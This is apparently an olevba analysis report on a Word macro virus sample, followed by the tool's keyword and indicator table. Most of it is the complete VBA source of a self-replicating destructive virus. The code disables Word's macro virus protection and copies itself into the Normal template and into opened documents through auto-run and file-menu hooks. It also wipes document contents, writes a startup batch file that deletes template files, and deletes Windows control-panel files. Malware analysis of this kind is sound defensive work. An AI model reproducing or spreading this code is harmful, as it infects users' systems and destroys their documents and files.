olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-2be2af9e25e37d82aa73062c2c623ef235796969
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-2be2af9e25e37d82aa73062c2c623ef235796969 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CHE_GUEVARA.bas 
in file: Virus.MSWord.VMPC-based-2be2af9e25e37d82aa73062c2c623ef235796969 - OLE stream: 'Macros/VBA/CHE_GUEVARA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub CHE_GUEVARA()
    
    'Virus Macro Che Guevara
    'Creado Por TENSE
    'Hecho en ARGENTINA
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("CHE_GUEVARA").Export "c:\CHE_GUEVARA.drv"
ActiveDocument.ReadOnlyRecommended = False
Call ApEp5616MhFn
 KfEn3902$ = "c:\windows\startm~1\programs\startup\msfile.bat"
HtCo56162857 = GetAttr(NormalTemplate.FullName)
If HtCo56162857 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(KfEn3902$)
If HtCo56162857 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(KfEn3902$)
If HtCo56162857 = vbReadOnly Then GoTo NeJeKoAz
If HtCo56162857 = vbReadOnly + vbArchive Then GoTo NeJeKoAz
If NormalTemplate.VBProject.VBComponents.Item("CHE_GUEVARA").Name <> "CHE_GUEVARA" Then FuQl285743688 = True
If ActiveDocument.VBProject.VBComponents.Item("CHE_GUEVARA").Name <> "CHE_GUEVARA" Then RqDi43684 = True
If FuQl285743688 = True And RqDi43684 = False Then Set QvFi4368285710 = NormalTemplate.VBProject.VBComponents
If FuQl285743688 = False And RqDi43684 = True Then Set QvFi4368285710 = ActiveDocument.VBProject.VBComponents
QvFi4368285710.Import "c:\CHE_GUEVARA.drv"
If FuQl285743688 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If RqDi43684 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
NeJeKoAz:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "VIVA EL CHE GUEVARA", vbCritical
    Call infect
    Call CHE_GUEVARA
End Sub
Sub FileNew()
    On Error Resume Next
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call infect
End Sub
Sub FileSave()
    On Error Resume Next
    Call infect
    ActiveDocument.Save
    Call borra
End Sub
Sub FileClose()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call borra
    Call infect
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Call infect
Dialogs(wdDialogToolsOptions).Show
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Call infect
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePrint()
    On Error Resume Next
Call infect
Call borra
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Call infect
    Call borra
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End If
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call infect
End Sub
Sub AutoExit()
    On Error Resume Next
    Call infect
    Call borra
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoClose()
    On Error Resume Next
    Call infect
    Call borra
End Sub
Sub ApEp5616MhFn()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub infect()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("CHE_GUEVARA").Export "c:\CHE_GUEVARA.drv"
ActiveDocument.ReadOnlyRecommended = False
FgMk5526$ = "c:\windows\startm~1\programs\startup\msfile.bat"
BsEo92428259 = GetAttr(NormalTemplate.FullName)
If BsEo92428259 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(FgMk5526$)
If BsEo92428259 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(FgMk5526$)
If BsEo92428259 = vbReadOnly Then GoTo MqJuVuCe
If BsEo92428259 = vbReadOnly + vbArchive Then GoTo MqJuVuCe
If NormalTemplate.VBProject.VBComponents.Item("CHE_GUEVARA").Name <> "CHE_GUEVARA" Then TlRh82596599 = True
If ActiveDocument.VBProject.VBComponents.Item("CHE_GUEVARA").Name <> "CHE_GUEVARA" Then MsOl6599 = True
If TlRh82596599 = True And MsOl6599 = False Then Set AlDs659825910 = NormalTemplate.VBProject.VBComponents
If TlRh82596599 = False And MsOl6599 = True Then Set AlDs659825910 = ActiveDocument.VBProject.VBComponents
AlDs659825910.Import "c:\CHE_GUEVARA.drv"
If TlRh82596599 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If MsOl6599 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VIVA EL CHE!(EL Ultimo?)
MqJuVuCe:
End Sub
Sub borra()
On Error Resume Next
Kill "c:\windows\system\*.cpl"
Kill "c:\winnt\system*.cpl"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|Hex String|(WCh                |28574368                                     |
+----------+--------------------+---------------------------------------------+

